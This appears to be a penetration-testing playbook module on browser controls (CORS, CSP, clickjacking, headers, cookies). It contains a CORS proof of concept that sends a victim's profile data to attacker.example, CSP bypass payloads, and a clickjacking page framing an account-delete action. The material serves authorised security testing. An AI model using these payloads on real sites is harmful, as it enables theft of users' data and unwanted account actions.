# Browser Policy Module

Covers: CORS misconfiguration, CSP bypass, clickjacking, security headers, cookie attributes, browser isolation headers, referrer leakage, permissions policy, MIME sniffing, and browser-context validation with Playwright/headless Chromium.

## Goals

- Identify browser-enforced controls that are missing, weak, or bypassable.
- Prove exploitability only when the weakness enables data access, state change, code execution, or meaningful user impact.
- Use browser validation for browser-only findings.

## CORS Misconfiguration

### Testing

```bash
# Origin reflection
scripts/openghost.sh exec-bash 'curl -s -I -H "Origin: https://evil.example" https://<target>/api/user | grep -i "access-control"'

# Null origin
scripts/openghost.sh exec-bash 'curl -s -I -H "Origin: null" https://<target>/api/user | grep -i "access-control"'

# Regex/subdomain bypasses
scripts/openghost.sh exec-bash 'curl -s -I -H "Origin: https://target.example.evil.example" https://<target>/api/user | grep -i "access-control"'
scripts/openghost.sh exec-bash 'curl -s -I -H "Origin: https://evil-target.example" https://<target>/api/user | grep -i "access-control"'
```

Critical pattern:

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

This is exploitable when the target endpoint returns sensitive authenticated data using cookies or ambient credentials.

### CORS PoC

```html
<script>
fetch('https://target.example/api/user/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)))
</script>
```

### Common Bypass Classes

- Reflect any `Origin` header.
- Allow `null` origin.
- Regex allows `target.example.evil.example`.
- Trust any subdomain while subdomain takeover is possible.
- Allow credentials on sensitive endpoints.
- Inconsistent CORS between API gateway and origin.

## Content Security Policy

### Collection

```bash
scripts/openghost.sh exec-bash 'curl -s -I https://<target> | grep -i content-security-policy'
```

### Weak Directives

| Weakness | Why It Matters |
|---|---|
| `script-src 'unsafe-inline'` | inline XSS payloads can execute |
| `script-src 'unsafe-eval'` | eval-like sinks become exploitable |
| wildcard script hosts | attacker may host scripts under allowed domain |
| broad CDN allowlist | JSONP/script gadgets may bypass CSP |
| missing `object-src` | plugin/object loading may be possible |
| missing `base-uri` | `<base>` injection can redirect relative scripts/forms |
| `report-only` only | CSP does not enforce |
| reused/static nonces | attacker can reuse a valid nonce |

### Bypass Ideas

```html
<!-- JSONP on allowed domain -->
<script src="https://allowed.example/jsonp?callback=alert"></script>

<!-- AngularJS gadget if allowed CDN hosts old Angular -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>

<!-- base-uri gap -->
<base href="https://attacker.example/">
```

CSP bypass is not a finding by itself unless paired with an injection point or a concrete bypass of intended security policy.

## Clickjacking

### Detection

```bash
scripts/openghost.sh exec-bash 'for p in / /account /settings /billing /transfer /admin; do echo -n "$p: "; curl -s -I https://<target>$p | grep -iE "(x-frame-options|frame-ancestors)" | tr -d "\r\n"; echo; done'
```

### PoC

```html
<html>
  <body>
    <h1>Click to continue</h1>
    <iframe src="https://target.example/account/delete" style="opacity:0.01;position:absolute;top:80px;left:80px;width:600px;height:400px"></iframe>
    <button style="position:absolute;top:220px;left:260px">Click here</button>
  </body>
</html>
```

Higher severity when the framed page performs sensitive actions, has no CSRF protection, or contains privileged controls.

### Frame-Busting Bypass

```html
<iframe src="https://target.example" sandbox="allow-forms allow-scripts"></iframe>
```

The `sandbox` attribute can block top-level navigation frame-busting scripts.

## Security Headers

```bash
scripts/openghost.sh exec-bash 'curl -s -I https://<target> | grep -iE "(strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|cross-origin|set-cookie|server|x-powered)"'
```

Expected baseline:

| Header | Expected |
|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` |
| `Content-Security-Policy` | restrictive, no unsafe directives unless justified |
| `X-Frame-Options` or CSP `frame-ancestors` | `DENY`, `SAMEORIGIN`, or allowlist |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` or stricter |
| `Permissions-Policy` | restrictive camera/mic/geolocation/payment controls |
| `Cross-Origin-Opener-Policy` | `same-origin` for sensitive apps |
| `Cross-Origin-Resource-Policy` | `same-origin` or `same-site` where applicable |
| `Cross-Origin-Embedder-Policy` | required only for cross-origin isolation use cases |

## Cookie Audit

```bash
scripts/openghost.sh exec-bash 'curl -s -I https://<target>/login | grep -i set-cookie'
```

Check:

- `Secure` for all session/auth cookies
- `HttpOnly` for tokens not needed by JavaScript
- `SameSite=Lax` or `Strict` unless cross-site auth flows require `None; Secure`
- domain not overly broad
- path scoped appropriately
- expiration not excessive

## Referrer Leakage

Check whether sensitive URLs include tokens or PII and can leak via Referer to third-party resources.

```bash
scripts/openghost.sh exec-bash 'curl -s https://<target>/account | grep -oE "https?://[^\"'"'"']+" | head'
```

High impact when reset tokens, OAuth codes, session identifiers, or PII appear in URLs and third-party requests are present.

## Browser Validation

Use browser automation when available for:

- DOM XSS
- clickjacking screenshots
- CSRF PoCs
- CORS read proof in real browser context
- SPA route testing
- OAuth redirect flows

Evidence should include screenshot, URL, browser action sequence, and request/response where possible.

## Reporting Checklist

- Header/cookie evidence from affected endpoint
- Browser PoC when browser behavior is required
- Data or action impact, not just missing header
- Exact affected paths, not only home page
- Remediation: strict allowlists, deny framing, restrictive CSP, secure cookies, HSTS, origin validation
